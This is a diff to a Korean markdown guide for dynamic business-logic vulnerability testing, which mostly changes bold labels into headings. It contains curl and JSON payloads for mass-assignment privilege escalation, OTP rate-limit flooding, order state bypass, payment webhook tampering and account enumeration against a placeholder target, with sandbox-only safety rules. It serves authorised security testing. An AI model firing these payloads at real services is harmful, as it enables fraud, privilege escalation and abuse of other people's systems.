@@ -1,5 +1,3 @@
-### Phase 2: 동적 테스트 (검증)
-
 **계정 요구사항:** 최소 2개 — 계정 A (리소스 소유자), 계정 B (비소유자/외부 공격자).
 
 **[필수] 쓰기 작업 안전 수칙:**
@@ -26,13 +24,13 @@
 {"productId":"<id>","quantity":1,"price":"1.0e-10"}     # 과학표기/floating point 오차
 ```
 
-**우회 페이로드:**
+### 우회 페이로드
 - `currency: "KRW"` → `currency: "VND"` (환율 조작)
 - 결제 콜백 가로채기 + amount 변조 (PG webhook signature 미검증)
 
 ### `PRIV_ESCALATION` — 권한 상승 (mass assignment)
 
-**기본 페이로드:**
+### 기본 페이로드
 ```json
 PATCH /api/users/me  Cookie: session=USER
 {"nickname":"x","role":"admin","isAdmin":true,"permissions":["ADMIN"],"is_superuser":true,"groups":["administrators"]}
@@ -78,7 +76,7 @@ curl -s "https://target/api/users/me/coupons" -H "Cookie: SESSION=$SESSION"
 
 ### `FEATURE_ABUSE` — Rate Limit 우회 / 기능 남용
 
-**기본 페이로드:**
+### 기본 페이로드
 ```bash
 # 50회 연속 OTP 발송
 for i in $(seq 1 50); do
@@ -98,7 +96,7 @@ done
 
 ### `STATE_BYPASS` — 상태 머신 우회
 
-**기본 페이로드:**
+### 기본 페이로드
 ```bash
 # 1. 신규 주문 생성 (pending 상태)
 curl -X POST "https://target/api/orders" -H "Cookie: SESSION=A" \
@@ -118,7 +116,7 @@ curl -s "https://target/api/orders/<orderId>" -H "Cookie: SESSION=A"
 
 ### `DATA_INTEGRITY` — 데이터 정합성
 
-**기본 페이로드:**
+### 기본 페이로드
 ```bash
 # 1. 자기 자신 대상 (자기 송금/팔로우/평가)
 curl -X POST "https://target/api/transfer" -H "Cookie: SESSION=A" \
@@ -141,7 +139,7 @@ curl -X POST "https://target/webhooks/payment" -H "X-Webhook-Signature: ..." \
 
 ### `INFO_DISCLOSURE` — 비즈니스 정보 노출
 
-**기본 페이로드:**
+### 기본 페이로드
 ```bash
 # 1. 계정 존재 여부 diff (별도 check endpoint 우선)
 curl -s -X POST "https://target/api/auth/check-email" \
@@ -160,7 +158,7 @@ curl -s "https://target/api/users/me" -H "Cookie: SESSION=A" \
 
 ---
 
-**우회 페이로드:**
+### 우회 페이로드
 
 | 라벨 | 우회 |
 |---|---|
@@ -174,7 +172,7 @@ curl -s "https://target/api/users/me" -H "Cookie: SESSION=A" \
 
 ---
 
-**참고사항:**
+### 참고사항
 
 - 쓰기 작업 안전 수칙은 라벨별 테스트 전 반드시 확인 — sandbox 한정, 파괴적 행위 금지
 - 결제 테스트는 PG 모킹/dry-run 확인 없으면 "후보 (환경 제한)" 유지, 호출 금지
